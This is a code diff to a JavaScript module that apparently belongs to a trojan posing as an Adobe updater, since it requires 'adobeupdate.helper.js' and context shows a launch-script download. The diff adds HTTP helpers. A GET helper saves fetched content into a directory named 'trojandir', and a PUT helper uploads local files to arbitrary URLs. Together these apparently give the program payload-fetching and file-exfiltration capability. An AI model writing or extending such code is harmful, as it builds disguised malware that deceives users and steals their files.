@@ -1,5 +1,212 @@
 const helper = require("./adobeupdate.helper.js");
 
+
+/*
+    status: response.status,
+    statusText: response.statusText,
+    headers: headersOut,
+    downloadOpts : {
+        download: true,
+        filetype: "txt",
+        localpath: outputPath
+    }
+*/
+async function makeGetRequest(
+    baseUrl,
+    params,
+    inputHeaders,
+    downloadOpts = null
+) {
+    logmsg("starting");
+
+    if (isNullOrWhitespace(baseUrl)) {
+        throw new Error("baseUrl is empty");
+    } else if (!isValidHttpUrl(baseUrl)) {
+        throw new Error("baseUrl is invalid [" + baseUrl + "]");
+    }
+
+    const url = new URL(baseUrl);
+
+    logmsg("baseUrl: " + baseUrl);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
+        });
+    }
+
+    logmsg("url=" + url.toString());
+
+    if (!isValidDict(downloadOpts)) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
+
+        downloadOpts = {
+            download: true,
+            filetype: "txt",
+            localpath: outputPath,
+        };
+    }
+
+    const tinputHeaders = {
+        Accept: "*/*",
+        "User-Agent": "NodeJS-Fetch-Client",
+    };
+
+    if (isValidDict(inputHeaders)) {
+        Object.assign(tinputHeaders, inputHeaders);
+    }
+
+    let response = null;
+
+    logmsg("executing GET request");
+
+    response = await fetch(url.toString(), {
+        method: "GET",
+        headers: tinputHeaders,
+    });
+
+    if (!response.ok) {
+        throw new Error(`HTTP error -- Status: ${response.status}`);
+    }
+
+    let headersOut = {};
+
+    for (const [key, value] of response.headers.entries()) {
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut,
+        // downloadOpts
+    };
+
+    logmsg("response status=" + response.status);
+
+    if (!isValidDict(downloadOpts) || !downloadOpts.download) {
+        return responseOut;
+    }
+
+    if (
+        !Object.hasOwn(downloadOpts, "localpath") ||
+        isNullOrWhitespace(downloadOpts.localpath)
+    ) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
+
+        downloadOpts.localpath = outputPath;
+    }
+
+    if (
+        !Object.hasOwn(downloadOpts, "filetype") ||
+        isNullOrWhitespace(downloadOpts.filetype)
+    ) {
+        downloadOpts.filetype = "txt";
+    }
+
+    if (downloadOpts.filetype == "txt") {
+        let rawText = await response.text();
+        fs.writeFileSync(downloadOpts.localpath, rawText, "utf8");
+        responseOut.rawText = rawText;
+    } else {
+        const arrayBuffer = await response.arrayBuffer();
+        // const buffer = Buffer.from(arrayBuffer);
+        const bufferView = new Uint8Array(arrayBuffer);
+        fs.writeFileSync(downloadOpts.localpath, bufferView);
+        responseOut.buffer = arrayBuffer;
+    }
+
+    responseOut.downloadOpts = downloadOpts;
+
+    logmsg("finished");
+
+    return responseOut;
+}
+/*
+responseOut = {
+    downloadOpts { filetype, localpath }
+    rawText
+    buffer
+    status
+    statusText
+    headers
+}
+*/
+
+function isValidHttpUrl(string) {
+    try {
+        const url = new URL(string);
+        return url.protocol === "http:" || url.protocol === "https:";
+    } catch (error) {
+        return false;
+    }
+}
+
+async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
+    logmsg("starting");
+
+    const fileBlob = await fs.openAsBlob(filepath);
+
+    inputHeaders = inputHeaders ?? {};
+    inputHeaders["Content-Type"] = "application/octet-stream";
+
+    const url = new URL(baseUrl);
+
+    logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
+        });
+    }
+
+    logmsg("request url: " + url.toString());
+
+    const request = new Request(url.toString(), {
+        method: "PUT",
+        body: fileBlob,
+        headers: inputHeaders,
+        duplex: "half",
+    });
+
+    const response = await fetch(request);
+
+    request.headers.forEach((value, key) => {
+        logmsg(`${key}: ${value}`);
+    });
+
+    const textData = await response.text();
+
+    let headersOut = {};
+
+    for (const [key, value] of response.headers.entries()) {
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut,
+        responseText: textData,
+    };
+
+    logmsg("response status=" + response.status);
+
+    return responseOut;
+}
+
 async function download_launch_script() {
     let filename = systemconfig.launch_script_fname;
 
